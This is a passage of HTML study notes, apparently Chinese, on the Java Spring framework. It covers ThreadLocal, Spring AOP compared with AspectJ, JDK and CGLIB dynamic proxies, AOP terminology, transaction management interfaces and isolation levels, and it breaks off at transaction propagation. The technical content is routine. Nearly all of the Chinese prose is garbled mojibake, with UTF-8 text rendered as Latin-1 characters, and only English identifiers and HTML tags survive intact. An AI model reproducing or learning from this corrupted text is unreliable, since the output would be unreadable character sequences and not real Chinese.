<p>åœ¨ç±»ä¸­å®šä¹‰ä¸€ä¸ªThreadLocalæˆå‘˜å˜é‡ï¼Œå°†éœ€è¦çš„å¯å˜æˆå‘˜å˜é‡ä¿å­˜åœ¨ ThreadLocal ä¸­ï¼ˆæ¨èçš„ä¸€ç§æ–¹å¼ï¼‰ã€‚</p>
</li>
</ol>
<h1 id="spring-aop" tabindex="-1"> Spring AOP</h1>
<p>AOP(Aspect-Oriented Programming:é¢å‘åˆ‡é¢ç¼–ç¨‹)èƒ½å¤Ÿå°†é‚£äº›ä¸ä¸šåŠ¡æ— å…³ï¼Œ<strong>å´ä¸ºä¸šåŠ¡æ¨¡å—æ‰€å…±åŒè°ƒç”¨çš„é€»è¾‘æˆ–è´£ä»»ï¼ˆä¾‹å¦‚äº‹åŠ¡å¤„ç†ã€æ—¥å¿—ç®¡ç†ã€æƒé™æ§åˆ¶ç­‰ï¼‰å°è£…èµ·æ¥</strong>ï¼Œä¾¿äº<strong>å‡å°‘ç³»ç»Ÿçš„é‡å¤ä»£ç </strong>ï¼Œ<strong>é™ä½æ¨¡å—é—´çš„è€¦åˆåº¦</strong>ï¼Œå¹¶<strong>æœ‰åˆ©äºæœªæ¥çš„å¯æ‹“å±•æ€§å’Œå¯ç»´æŠ¤æ€§</strong>ã€‚</p>
<p>AOPæ€æƒ³çš„å®ç°ä¸€èˆ¬éƒ½æ˜¯åŸºäº <strong>ä»£ç†æ¨¡å¼</strong> ï¼Œåœ¨JAVAä¸­ä¸€èˆ¬é‡‡ç”¨JDKåŠ¨æ€ä»£ç†æ¨¡å¼ï¼Œä½†æ˜¯æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œ<strong>JDKåŠ¨æ€ä»£ç†æ¨¡å¼åªèƒ½ä»£ç†æ¥å£è€Œä¸èƒ½ä»£ç†ç±»</strong>ã€‚å› æ­¤ï¼ŒSpring AOP ä¼šè¿™æ ·å­æ¥è¿›è¡Œåˆ‡æ¢ï¼Œå› ä¸ºSpring AOP åŒæ—¶æ”¯æŒ CGLIBã€ASPECTJã€JDKåŠ¨æ€ä»£ç†ã€‚</p>
<ul>
<li>å¦‚æœç›®æ ‡å¯¹è±¡çš„å®ç°ç±»å®ç°äº†æ¥å£ï¼ŒSpring AOP å°†ä¼šé‡‡ç”¨ JDK åŠ¨æ€ä»£ç†æ¥ç”Ÿæˆ AOP ä»£ç†ç±»ï¼›</li>
<li>å¦‚æœç›®æ ‡å¯¹è±¡çš„å®ç°ç±»æ²¡æœ‰å®ç°æ¥å£ï¼ŒSpring AOP å°†ä¼šé‡‡ç”¨ CGLIB æ¥ç”Ÿæˆ AOP ä»£ç†ç±»;ä¸è¿‡è¿™ä¸ªé€‰æ‹©è¿‡ç¨‹å¯¹å¼€å‘è€…å®Œå…¨é€æ˜ã€å¼€å‘è€…ä¹Ÿæ— éœ€å…³å¿ƒã€‚</li>
</ul>
<p><img src="@source/assets/cs-note/framework/spring/SpringAOP-Process.png" alt="SpringAOPProcess" loading="lazy"></p>
<p>å½“ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ AspectJ ,Spring AOP å·²ç»é›†æˆäº†AspectJ ï¼ŒAspectJ åº”è¯¥ç®—çš„ä¸Šæ˜¯ Java ç”Ÿæ€ç³»ç»Ÿä¸­æœ€å®Œæ•´çš„ AOP æ¡†æ¶äº†ã€‚</p>
<p>ä½¿ç”¨ AOP ä¹‹åæˆ‘ä»¬å¯ä»¥æŠŠä¸€äº›é€šç”¨åŠŸèƒ½æŠ½è±¡å‡ºæ¥ï¼Œåœ¨éœ€è¦ç”¨åˆ°çš„åœ°æ–¹ç›´æ¥ä½¿ç”¨å³å¯ï¼Œè¿™æ ·å¤§å¤§ç®€åŒ–äº†ä»£ç é‡ã€‚æˆ‘ä»¬éœ€è¦å¢åŠ æ–°åŠŸèƒ½æ—¶ä¹Ÿæ–¹ä¾¿ï¼Œè¿™æ ·ä¹Ÿæé«˜äº†ç³»ç»Ÿæ‰©å±•æ€§ã€‚æ—¥å¿—åŠŸèƒ½ã€äº‹åŠ¡ç®¡ç†ç­‰ç­‰åœºæ™¯éƒ½ç”¨åˆ°äº† AOP</p>
<h2 id="spring-aop-å’Œ-aspectj-aop" tabindex="-1"> Spring AOP å’Œ AspectJ AOP</h2>
<p>Spring AOP å±äº<strong>è¿è¡Œæ—¶å¢å¼º</strong>ï¼Œè€Œ AspectJ æ˜¯<strong>ç¼–è¯‘æ—¶å¢å¼º</strong>ã€‚ Spring AOP åŸºäºä»£ç†(Proxying)ï¼Œè€Œ AspectJ åŸºäºå­—èŠ‚ç æ“ä½œ(Bytecode Manipulation)ã€‚</p>
<p>Spring AOP å·²ç»é›†æˆäº† AspectJ ï¼ŒAspectJ åº”è¯¥ç®—çš„ä¸Šæ˜¯ Java ç”Ÿæ€ç³»ç»Ÿä¸­æœ€å®Œæ•´çš„ AOP æ¡†æ¶äº†ã€‚AspectJ ç›¸æ¯”äº Spring AOP åŠŸèƒ½æ›´åŠ å¼ºå¤§ï¼Œä½†æ˜¯ Spring AOP ç›¸å¯¹æ¥è¯´æ›´ç®€å•ï¼Œ</p>
<p>å¦‚æœæˆ‘ä»¬çš„åˆ‡é¢æ¯”è¾ƒå°‘ï¼Œé‚£ä¹ˆä¸¤è€…æ€§èƒ½å·®å¼‚ä¸å¤§ã€‚ä½†æ˜¯ï¼Œå½“åˆ‡é¢å¤ªå¤šçš„è¯ï¼Œæœ€å¥½é€‰æ‹© AspectJ ï¼Œå®ƒæ¯”Spring AOP å¿«å¾ˆå¤šã€‚</p>
<h3 id="spring-aop-åŸºäºaspectjæ³¨è§£å®ç°aop" tabindex="-1"> Spring AOP åŸºäºAspectJæ³¨è§£å®ç°AOP</h3>
<p><strong>AspectJæ˜¯ä¸€ä¸ªAOPæ¡†æ¶ï¼Œå®ƒèƒ½å¤Ÿå¯¹javaä»£ç è¿›è¡ŒAOPç¼–è¯‘ï¼ˆä¸€èˆ¬åœ¨ç¼–è¯‘æœŸè¿›è¡Œï¼‰ï¼Œè®©javaä»£ç å…·æœ‰AspectJçš„AOPåŠŸèƒ½ï¼ˆå½“ç„¶éœ€è¦ç‰¹æ®Šçš„ç¼–è¯‘å™¨ï¼‰</strong>ï¼Œå¯ä»¥è¿™æ ·è¯´AspectJæ˜¯ç›®å‰å®ç°AOPæ¡†æ¶ä¸­æœ€æˆç†Ÿï¼ŒåŠŸèƒ½æœ€ä¸°å¯Œçš„è¯­è¨€ï¼Œæ›´å¹¸è¿çš„æ˜¯ï¼ŒAspectJä¸javaç¨‹åºå®Œå…¨å…¼å®¹ï¼Œå‡ ä¹æ˜¯æ— ç¼å…³è”ï¼Œå› æ­¤å¯¹äºæœ‰javaç¼–ç¨‹åŸºç¡€çš„å·¥ç¨‹å¸ˆï¼Œä¸Šæ‰‹å’Œä½¿ç”¨éƒ½éå¸¸å®¹æ˜“ã€‚Springæ³¨æ„åˆ°AspectJåœ¨AOPçš„å®ç°æ–¹å¼ä¸Šä¾èµ–äºç‰¹æ®Šç¼–è¯‘å™¨(ajcç¼–è¯‘å™¨)ï¼Œå› æ­¤Springå¾ˆæœºæ™ºå›é¿äº†è¿™ç‚¹ï¼Œè½¬å‘é‡‡ç”¨åŠ¨æ€ä»£ç†æŠ€æœ¯çš„å®ç°åŸç†æ¥æ„å»ºSpring AOPçš„å†…éƒ¨æœºåˆ¶ï¼ˆåŠ¨æ€ç»‡å…¥ï¼‰ï¼Œè¿™æ˜¯ä¸AspectJï¼ˆé™æ€ç»‡å…¥ï¼‰æœ€æ ¹æœ¬çš„åŒºåˆ«ã€‚<strong>Spring åªæ˜¯ä½¿ç”¨äº†ä¸ AspectJ 5 ä¸€æ ·çš„æ³¨è§£ï¼Œä½†ä»ç„¶æ²¡æœ‰ä½¿ç”¨ AspectJ çš„ç¼–è¯‘å™¨ï¼Œåº•å±‚ä¾æ˜¯åŠ¨æ€ä»£ç†æŠ€æœ¯çš„å®ç°ï¼Œå› æ­¤å¹¶ä¸ä¾èµ–äº AspectJ çš„ç¼–è¯‘å™¨</strong>ã€‚ Spring AOPè™½ç„¶æ˜¯ä½¿ç”¨äº†é‚£ä¸€å¥—æ³¨è§£ï¼Œå…¶å®å®ç°AOPçš„åº•å±‚æ˜¯ä½¿ç”¨äº†åŠ¨æ€ä»£ç†(JDKæˆ–è€…CGLib)æ¥åŠ¨æ€ç»‡å…¥ã€‚</p>
<h4 id="jdkåŠ¨æ€ä»£ç†" tabindex="-1"> JDKåŠ¨æ€ä»£ç†</h4>
<p>JDKåŠ¨æ€ä»£ç†çš„æ ¸å¿ƒæ˜¯InvocationHandleræ¥å£å’ŒProxyç±»ï¼ŒJDK ä½¿ç”¨åå°„æœºåˆ¶è°ƒç”¨ç›®æ ‡ç±»çš„æ–¹æ³•</p>
<p>JDK åŠ¨æ€ä»£ç†æœºåˆ¶åªèƒ½å¯¹æ¥å£è¿›è¡Œä»£ç†ï¼Œå…¶åŸç†æ˜¯åŠ¨æ€ç”Ÿæˆä¸€ä¸ªä»£ç†ç±»ï¼Œè¿™ä¸ªä»£ç†ç±»å®ç°äº†ç›®æ ‡å¯¹è±¡çš„æ¥å£ï¼Œç›®æ ‡å¯¹è±¡å’Œä»£ç†ç±»éƒ½å®ç°äº†æ¥å£ï¼Œä½†æ˜¯ç›®æ ‡å¯¹è±¡å’Œä»£ç†ç±»çš„ Class å¯¹è±¡æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ‰€ä»¥ä¸¤è€…æ˜¯æ²¡æ³•ç›¸äº’èµ‹å€¼çš„ã€‚</p>
<h4 id="cglibåŠ¨æ€ä»£ç†" tabindex="-1"> CGLIBåŠ¨æ€ä»£ç†</h4>
<p>CGLIB æ˜¯å¯¹ç›®æ ‡å¯¹è±¡æœ¬èº«è¿›è¡Œä»£ç†ï¼Œæ‰€ä»¥æ— è®ºç›®æ ‡å¯¹è±¡æ˜¯å¦æœ‰æ¥å£ï¼Œéƒ½å¯ä»¥å¯¹ç›®æ ‡å¯¹è±¡è¿›è¡Œä»£ç†ï¼Œå…¶åŸç†æ˜¯ä½¿ç”¨å­—èŠ‚ç ç”Ÿæˆå·¥å…·åœ¨å†…å­˜ç”Ÿæˆä¸€ä¸ªç»§æ‰¿ç›®æ ‡å¯¹è±¡çš„ä»£ç†ç±»ï¼Œç„¶ååˆ›å»ºä»£ç†å¯¹è±¡å®ä¾‹ã€‚</p>
<p>ç”±äºä»£ç†ç±»çš„çˆ¶ç±»æ˜¯ç›®æ ‡å¯¹è±¡ï¼Œæ‰€ä»¥ä»£ç†ç±»æ˜¯å¯ä»¥èµ‹å€¼ç»™ç›®æ ‡å¯¹è±¡çš„ï¼Œè‡ªç„¶å¦‚æœç›®æ ‡å¯¹è±¡æœ‰æ¥å£ï¼Œä»£ç†å¯¹è±¡ä¹Ÿæ˜¯å¯ä»¥èµ‹å€¼ç»™æ¥å£çš„ã€‚</p>
<p>CGLIB åŠ¨æ€ä»£ç†ä¸­ç”Ÿæˆçš„ä»£ç†ç±»çš„å­—èŠ‚ç ç›¸æ¯” JDK æ¥è¯´æ›´åŠ å¤æ‚ã€‚</p>
<h2 id="aop-åŸºæœ¬æ¦‚å¿µ" tabindex="-1"> AOP åŸºæœ¬æ¦‚å¿µ</h2>
<ul>
<li>é€šçŸ¥(Adivce)ï¼šé€šçŸ¥æœ‰5ç§ç±»å‹
<ul>
<li>Beforeï¼šåœ¨æ–¹æ³•è¢«è°ƒç”¨ä¹‹å‰è°ƒç”¨</li>
<li>Afterï¼šåœ¨æ–¹æ³•å®Œæˆåè°ƒç”¨é€šçŸ¥ï¼Œæ— è®ºæ–¹æ³•æ˜¯å¦æ‰§è¡ŒæˆåŠŸ</li>
<li>After-returningï¼šåœ¨æ–¹æ³•æˆåŠŸæ‰§è¡Œä¹‹åè°ƒç”¨é€šçŸ¥</li>
<li>After-throwingï¼šåœ¨æ–¹æ³•æŠ›å‡ºå¼‚å¸¸åè°ƒç”¨é€šçŸ¥</li>
<li>Aroundï¼šåœ¨è¢«é€šçŸ¥çš„æ–¹æ³•è°ƒç”¨ä¹‹å‰åè°ƒç”¨ä¹‹åæ‰§è¡Œè‡ªå®šä¹‰çš„è¡Œä¸º</li>
</ul>
</li>
<li>åˆ‡ç‚¹ï¼ˆPointcutï¼‰ï¼šå¯¹åº”ç³»ç»Ÿä¸­çš„æ–¹æ³•ï¼›è¿™ä¸ªæ–¹æ³•æ˜¯å®šä¹‰åœ¨åˆ‡é¢ä¸­çš„æ–¹æ³•ï¼Œä¸€èˆ¬å’Œé€šçŸ¥ä¸€èµ·ä½¿ç”¨ï¼Œä¸€èµ·ç»„æˆäº†åˆ‡é¢ã€‚</li>
<li>è¿æ¥ç‚¹ï¼ˆJoin pointï¼‰ï¼šç†è®ºä¸Š, ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­çš„ä»»ä½•æ—¶ç‚¹éƒ½å¯ä»¥ä½œä¸ºä½œä¸ºç»‡å…¥ç‚¹, è€Œæ‰€æœ‰è¿™äº›æ‰§è¡Œæ—¶ç‚¹éƒ½æ˜¯ Joint pointï¼›ä½† Spring AOP ç›®å‰ä»…æ”¯æŒæ–¹æ³•æ‰§è¡Œ (method execution)ä¹Ÿå¯ä»¥è¿™æ ·ç†è§£ï¼Œè¿æ¥ç‚¹å°±æ˜¯ä½ å‡†å¤‡åœ¨ç³»ç»Ÿä¸­æ‰§è¡Œåˆ‡ç‚¹å’Œåˆ‡å…¥é€šçŸ¥çš„åœ°æ–¹ï¼ˆä¸€èˆ¬æ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªå­—æ®µï¼‰</li>
<li>åˆ‡é¢ï¼ˆAspectï¼‰ï¼šåˆ‡é¢æ˜¯åˆ‡ç‚¹å’Œé€šçŸ¥çš„é›†åˆï¼Œä¸€èˆ¬å•ç‹¬ä½œä¸ºä¸€ä¸ªç±»ã€‚é€šçŸ¥å’Œåˆ‡ç‚¹å…±åŒå®šä¹‰äº†å…³äºåˆ‡é¢çš„å…¨éƒ¨å†…å®¹ï¼Œå®ƒæ˜¯ä»€ä¹ˆæ—¶å€™ï¼Œåœ¨ä½•æ—¶å’Œä½•å¤„å®ŒæˆåŠŸèƒ½</li>
<li>å¼•å…¥ï¼ˆIntroductionï¼‰ï¼šå¼•ç”¨å…è®¸æˆ‘ä»¬å‘ç°æœ‰çš„ç±»æ·»åŠ æ–°çš„æ–¹æ³•æˆ–è€…å±æ€§</li>
<li>ç»‡å…¥ï¼ˆWeavingï¼‰ï¼šç»„è£…æ–¹é¢æ¥åˆ›å»ºä¸€ä¸ªè¢«é€šçŸ¥å¯¹è±¡ã€‚è¿™å¯ä»¥åœ¨ç¼–è¯‘æ—¶å®Œæˆï¼ˆä¾‹å¦‚ä½¿ç”¨AspectJç¼–è¯‘å™¨ï¼‰ï¼Œä¹Ÿå¯ä»¥åœ¨è¿è¡Œæ—¶å®Œæˆã€‚Springå’Œå…¶ä»–çº¯Java AOPæ¡†æ¶ä¸€æ ·ï¼Œåœ¨è¿è¡Œæ—¶å®Œæˆç»‡å…¥ã€‚</li>
</ul>
<h2 id="spring-aop-å®ç°æ–¹å¼" tabindex="-1"> Spring AOP å®ç°æ–¹å¼</h2>
<h3 id="åŸºäº-schema-spring-aop" tabindex="-1"> åŸºäº Schema(Spring AOP)</h3>
<p>Springé»˜è®¤æ”¯æŒçš„AOPæ–¹å¼</p>
<p><strong>åˆ†ç±»</strong></p>
<ul>
<li>ç¼–ç¨‹å¼</li>
<li>å£°æ˜å¼(åŸºäºé…ç½®)
<ul>
<li>æ‰‹å·¥ä»£ç†</li>
<li>è‡ªåŠ¨ä»£ç†
<ul>
<li>æ‰«æ Bean åç§°</li>
<li>æ‰«æåˆ‡é¢é…ç½®</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>æ³¨æ„</strong></p>
<ul>
<li>åŸºäºXMLçš„æ–¹å¼é…ç½®(åœ¨ <code>&lt;aop:config&gt;</code> é…ç½®)</li>
<li>æ¯ä¸ªé€šçŸ¥éƒ½éœ€è¦å®ç°æ¥å£æˆ–ç±»</li>
</ul>
<h3 id="åŸºäº-aspectj-spring-aspectj" tabindex="-1"> åŸºäº AspectJ(Spring + AspectJ)</h3>
<p><strong>åˆ†ç±»</strong></p>
<ul>
<li>åŸºäºé…ç½®(åœ¨ <code>&lt;aop:config&gt;</code> çš„å­æ ‡ç­¾ <code>&lt;aop:aspect&gt;</code>ä¸­é…ç½®)</li>
<li>åŸºäºæ³¨è§£</li>
</ul>
<p><strong>æ³¨æ„</strong></p>
<ul>
<li>æ¯ä¸ªé€šçŸ¥ä¸éœ€è¦å®ç°æ¥å£æˆ–ç±»</li>
</ul>
<h3 id="å®ç°å¯¹æ¯”" tabindex="-1"> å®ç°å¯¹æ¯”</h3>
<p><strong>ç»‡å…¥çš„æ—¶æœŸä¸åŒ</strong></p>
<ul>
<li>Spring Aopé‡‡ç”¨çš„åŠ¨æ€ç»‡å…¥ã€‚åŠ¨æ€ç»‡å…¥åˆåˆ†é™åŠ¨ä¸¤ç§ï¼Œé™åˆ™æŒ‡ç»‡å…¥è¿‡ç¨‹åªåœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶æ‰§è¡Œï¼›åŠ¨åˆ™æŒ‡æ ¹æ®ä»£ç åŠ¨æ€è¿è¡Œçš„ä¸­é—´çŠ¶æ€æ¥å†³å®šå¦‚ä½•æ“ä½œï¼Œæ¯æ¬¡è°ƒç”¨Targetçš„æ—¶å€™éƒ½æ‰§è¡Œã€‚</li>
<li>Aspectjæ˜¯é™æ€ç»‡å…¥ã€‚é™æ€ç»‡å…¥ï¼šæŒ‡åœ¨ç¼–è¯‘æ—¶æœŸå°±ç»‡å…¥ï¼Œå³ï¼šç¼–è¯‘å‡ºæ¥çš„classæ–‡ä»¶ï¼Œå­—èŠ‚ç å°±å·²ç»è¢«ç»‡å…¥äº†ã€‚</li>
</ul>
<p><strong>ä½¿ç”¨å¯¹è±¡ä¸åŒ</strong></p>
<ul>
<li>Spring AOPçš„é€šçŸ¥æ˜¯åŸºäºè¯¥å¯¹è±¡æ˜¯SpringBeanå¯¹è±¡æ‰å¯ä»¥</li>
<li>AspectJå¯ä»¥åœ¨ä»»ä½•Javaå¯¹è±¡ä¸Šåº”ç”¨é€šçŸ¥</li>
</ul>
<h1 id="spring-äº‹åŠ¡" tabindex="-1"> Spring äº‹åŠ¡</h1>
<h2 id="springäº‹åŠ¡ç®¡ç†æ–¹å¼" tabindex="-1"> Springäº‹åŠ¡ç®¡ç†æ–¹å¼</h2>
<p>Spring ç®¡ç†äº‹åŠ¡çš„æ–¹å¼</p>
<ol>
<li>ç¼–ç¨‹å¼äº‹åŠ¡ï¼šåœ¨ä»£ç ä¸­ç¡¬ç¼–ç ã€‚(ä¸æ¨èä½¿ç”¨)(é€šè¿‡Transaction Templateæ‰‹åŠ¨ç®¡ç†äº‹åŠ¡)</li>
<li>å£°æ˜å¼äº‹åŠ¡ï¼šåœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®ï¼ˆæ¨èä½¿ç”¨ï¼‰(å®é™…æ˜¯é€šè¿‡AOPå®ç°)</li>
</ol>
<p><strong>å£°æ˜å¼äº‹åŠ¡åˆåˆ†ä¸ºä¸¤ç§ï¼š</strong></p>
<ol>
<li>åŸºäºXMLçš„å£°æ˜å¼äº‹åŠ¡ï¼šåŸºäº <code>&lt;tx&gt;</code> å’Œ <code>&lt;aop&gt;</code> å‘½åç©ºé—´çš„å£°æ˜å¼äº‹åŠ¡ç®¡ç†ï¼š ç›®å‰æ¨èçš„æ–¹å¼ï¼Œå…¶æœ€å¤§ç‰¹ç‚¹æ˜¯ä¸ Spring AOP ç»“åˆç´§å¯†ï¼Œå¯ä»¥å……åˆ†åˆ©ç”¨åˆ‡ç‚¹è¡¨è¾¾å¼çš„å¼ºå¤§æ”¯æŒï¼Œä½¿å¾—ç®¡ç†äº‹åŠ¡æ›´åŠ çµæ´»ã€‚</li>
<li>åŸºäºæ³¨è§£çš„å£°æ˜å¼äº‹åŠ¡ï¼šåŸºäº @Transactional çš„å…¨æ³¨è§£æ–¹å¼ï¼š å°†å£°æ˜å¼äº‹åŠ¡ç®¡ç†ç®€åŒ–åˆ°äº†æè‡´ã€‚å¼€å‘äººå‘˜åªéœ€åœ¨é…ç½®æ–‡ä»¶ä¸­åŠ ä¸Šä¸€è¡Œå¯ç”¨ç›¸å…³åå¤„ç† Bean çš„é…ç½®ï¼Œç„¶ååœ¨éœ€è¦å®æ–½äº‹åŠ¡ç®¡ç†çš„æ–¹æ³•æˆ–è€…ç±»ä¸Šä½¿ç”¨ @Transactional æŒ‡å®šäº‹åŠ¡è§„åˆ™å³å¯å®ç°äº‹åŠ¡ç®¡ç†ï¼Œè€Œä¸”åŠŸèƒ½ä¹Ÿä¸å¿…å…¶ä»–æ–¹å¼é€Šè‰²ã€‚</li>
</ol>
<h2 id="springäº‹åŠ¡ç®¡ç†æ¥å£" tabindex="-1"> Springäº‹åŠ¡ç®¡ç†æ¥å£</h2>
<ul>
<li>PlatformTransactionManagerï¼š ï¼ˆå¹³å°ï¼‰äº‹åŠ¡ç®¡ç†å™¨</li>
<li>TransactionDefinitionï¼š äº‹åŠ¡å®šä¹‰ä¿¡æ¯(äº‹åŠ¡éš”ç¦»çº§åˆ«ã€ä¼ æ’­è¡Œä¸ºã€è¶…æ—¶ã€åªè¯»ã€å›æ»šè§„åˆ™)</li>
<li>TransactionStatusï¼š äº‹åŠ¡è¿è¡ŒçŠ¶æ€</li>
</ul>
<p>æ‰€è°“äº‹åŠ¡ç®¡ç†ï¼Œå…¶å®å°±æ˜¯â€œæŒ‰ç…§ç»™å®šçš„äº‹åŠ¡è§„åˆ™æ¥æ‰§è¡Œæäº¤æˆ–è€…å›æ»šæ“ä½œâ€ã€‚</p>
<p><strong>PlatformTransactionManager</strong></p>
<ul>
<li>Springå¹¶ä¸ç›´æ¥ç®¡ç†äº‹åŠ¡ï¼Œè€Œæ˜¯æä¾›äº†å¤šç§äº‹åŠ¡ç®¡ç†å™¨ ï¼Œä»–ä»¬å°†äº‹åŠ¡ç®¡ç†çš„èŒè´£å§”æ‰˜ç»™Hibernateæˆ–è€…JTAç­‰æŒä¹…åŒ–æœºåˆ¶æ‰€æä¾›çš„ç›¸å…³å¹³å°æ¡†æ¶çš„äº‹åŠ¡æ¥å®ç°ã€‚ Springäº‹åŠ¡ç®¡ç†å™¨çš„æ¥å£æ˜¯ï¼š org.springframework.transaction.PlatformTransactionManager ï¼Œé€šè¿‡è¿™ä¸ªæ¥å£ï¼ŒSpringä¸ºå„ä¸ªå¹³å°å¦‚JDBCã€Hibernateç­‰éƒ½æä¾›äº†å¯¹åº”çš„äº‹åŠ¡ç®¡ç†å™¨ï¼Œä½†æ˜¯å…·ä½“çš„å®ç°å°±æ˜¯å„ä¸ªå¹³å°è‡ªå·±çš„äº‹æƒ…äº†ã€‚</li>
<li>äº‹åŠ¡ç®¡ç†å™¨æ¥å£ PlatformTransactionManager é€šè¿‡ getTransaction(TransactionDefinition definition) æ–¹æ³•æ¥å¾—åˆ°ä¸€ä¸ªäº‹åŠ¡ï¼Œè¿™ä¸ªæ–¹æ³•é‡Œé¢çš„å‚æ•°æ˜¯ TransactionDefinitionç±» ï¼Œè¿™ä¸ªç±»å°±å®šä¹‰äº†ä¸€äº›åŸºæœ¬çš„äº‹åŠ¡å±æ€§ã€‚</li>
</ul>
<p><strong>TransactionDefinition</strong> æ¥å£ä¸­å®šä¹‰äº†5ä¸ªæ–¹æ³•ä»¥åŠä¸€äº›è¡¨ç¤ºäº‹åŠ¡å±æ€§çš„å¸¸é‡æ¯”å¦‚éš”ç¦»çº§åˆ«ã€ä¼ æ’­è¡Œä¸ºç­‰ç­‰çš„å¸¸é‡ã€‚</p>
<p><strong>TransactionStatus</strong> æ¥å£ç”¨æ¥è®°å½•äº‹åŠ¡çš„çŠ¶æ€ è¯¥æ¥å£å®šä¹‰äº†ä¸€ç»„æ–¹æ³•,ç”¨æ¥è·å–æˆ–åˆ¤æ–­äº‹åŠ¡çš„ç›¸åº”çŠ¶æ€ä¿¡æ¯</p>
<ul>
<li>PlatformTransactionManager.getTransaction(...) æ–¹æ³•è¿”å›ä¸€ä¸ª TransactionStatus å¯¹è±¡ã€‚è¿”å›çš„TransactionStatus å¯¹è±¡å¯èƒ½ä»£è¡¨ä¸€ä¸ªæ–°çš„æˆ–å·²ç»å­˜åœ¨çš„äº‹åŠ¡ï¼ˆå¦‚æœåœ¨å½“å‰è°ƒç”¨å †æ ˆæœ‰ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„äº‹åŠ¡ï¼‰ã€‚</li>
</ul>
<h2 id="äº‹åŠ¡å±æ€§" tabindex="-1"> äº‹åŠ¡å±æ€§</h2>
<p><img src="@source/assets/cs-note/framework/spring/Springäº‹åŠ¡å±æ€§.png" alt="Springäº‹åŠ¡å±æ€§" loading="lazy"></p>
<h3 id="äº‹åŠ¡éš”ç¦»çº§åˆ«" tabindex="-1"> äº‹åŠ¡éš”ç¦»çº§åˆ«</h3>
<p>åœ¨å…¸å‹çš„åº”ç”¨ç¨‹åºä¸­ï¼Œå¤šä¸ªäº‹åŠ¡å¹¶å‘è¿è¡Œï¼Œç»å¸¸ä¼šæ“ä½œç›¸åŒçš„æ•°æ®æ¥å®Œæˆå„è‡ªçš„ä»»åŠ¡ï¼ˆå¤šä¸ªç”¨æˆ·å¯¹ç»Ÿä¸€æ•°æ®è¿›è¡Œæ“ä½œï¼‰,å¹¶å‘è™½ç„¶æ˜¯å¿…é¡»çš„ï¼Œä½†å¯èƒ½ä¼šå¯¼è‡´ä¸€ä¸‹çš„é—®é¢˜ã€‚</p>
<p><strong>TransactionDefinition æ¥å£ä¸­å®šä¹‰äº†äº”ä¸ªè¡¨ç¤ºéš”ç¦»çº§åˆ«çš„å¸¸é‡ï¼š</strong></p>
<ul>
<li><strong>TransactionDefinition.ISOLATION_DEFAULT:</strong>          ä½¿ç”¨åç«¯æ•°æ®åº“é»˜è®¤çš„éš”ç¦»çº§åˆ«ï¼ŒMysql é»˜è®¤é‡‡ç”¨çš„ REPEATABLE_READéš”ç¦»çº§åˆ« Oracle é»˜è®¤é‡‡ç”¨çš„ READ_COMMITTEDéš”ç¦»çº§åˆ«.</li>
<li><strong>TransactionDefinition.ISOLATION_READ_UNCOMMITTED:</strong> æœ€ä½çš„éš”ç¦»çº§åˆ«ï¼Œå…è®¸è¯»å–å°šæœªæäº¤çš„æ•°æ®å˜æ›´ï¼Œ<strong>å¯èƒ½ä¼šå¯¼è‡´è„è¯»ã€å¹»è¯»æˆ–ä¸å¯é‡å¤è¯»</strong></li>
<li><strong>TransactionDefinition.ISOLATION_READ_COMMITTED:</strong>   å…è®¸è¯»å–å¹¶å‘äº‹åŠ¡å·²ç»æäº¤çš„æ•°æ®ï¼Œ<strong>å¯ä»¥é˜»æ­¢è„è¯»ï¼Œä½†æ˜¯å¹»è¯»æˆ–ä¸å¯é‡å¤è¯»ä»æœ‰å¯èƒ½å‘ç”Ÿ</strong></li>
<li><strong>TransactionDefinition.ISOLATION_REPEATABLE_READ:</strong>  å¯¹åŒä¸€å­—æ®µçš„å¤šæ¬¡è¯»å–ç»“æœéƒ½æ˜¯ä¸€è‡´çš„ï¼Œé™¤éæ•°æ®æ˜¯è¢«æœ¬èº«äº‹åŠ¡è‡ªå·±æ‰€ä¿®æ”¹ï¼Œ<strong>å¯ä»¥é˜»æ­¢è„è¯»å’Œä¸å¯é‡å¤è¯»ï¼Œä½†å¹»è¯»ä»æœ‰å¯èƒ½å‘ç”Ÿã€‚</strong></li>
<li><strong>TransactionDefinition.ISOLATION_SERIALIZABLE:</strong>     æœ€é«˜çš„éš”ç¦»çº§åˆ«ï¼Œå®Œå…¨æœä»ACIDçš„éš”ç¦»çº§åˆ«ã€‚æ‰€æœ‰çš„äº‹åŠ¡ä¾æ¬¡é€ä¸ªæ‰§è¡Œï¼Œè¿™æ ·äº‹åŠ¡ä¹‹é—´å°±å®Œå…¨ä¸å¯èƒ½äº§ç”Ÿå¹²æ‰°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>è¯¥çº§åˆ«å¯ä»¥é˜²æ­¢è„è¯»ã€ä¸å¯é‡å¤è¯»ä»¥åŠå¹»è¯»</strong>ã€‚ä½†æ˜¯è¿™å°†ä¸¥é‡å½±å“ç¨‹åºçš„æ€§èƒ½ã€‚é€šå¸¸æƒ…å†µä¸‹ä¹Ÿä¸ä¼šç”¨åˆ°è¯¥çº§åˆ«ã€‚</li>
</ul>
<h3 id="äº‹åŠ¡ä¼ æ’­è¡Œä¸º" tabindex="-1"> äº‹åŠ¡ä¼ æ’­è¡Œä¸º</h3>
<p>å½“äº‹åŠ¡æ–¹æ³•è¢«å¦ä¸€ä¸ªäº‹åŠ¡æ–¹æ³•è°ƒç”¨æ—¶ï¼Œå¿…é¡»æŒ‡å®šäº‹åŠ¡åº”è¯¥å¦‚ä½•ä¼ æ’­ã€‚ä¾‹å¦‚ï¼šæ–¹æ³•å¯èƒ½ç»§ç»­åœ¨ç°æœ‰äº‹åŠ¡ä¸­è¿è¡Œï¼Œä¹Ÿå¯èƒ½å¼€å¯ä¸€ä¸ªæ–°äº‹åŠ¡ï¼Œå¹¶åœ¨è‡ªå·±çš„äº‹åŠ¡ä¸­è¿è¡Œã€‚</p>
<p>Spring äº‹åŠ¡ä¸­çš„äº‹åŠ¡ä¼ æ’­è¡Œä¸ºï¼š</p>
<p><strong>æ”¯æŒå½“å‰äº‹åŠ¡çš„æƒ…å†µï¼š</strong></p>
<ul>
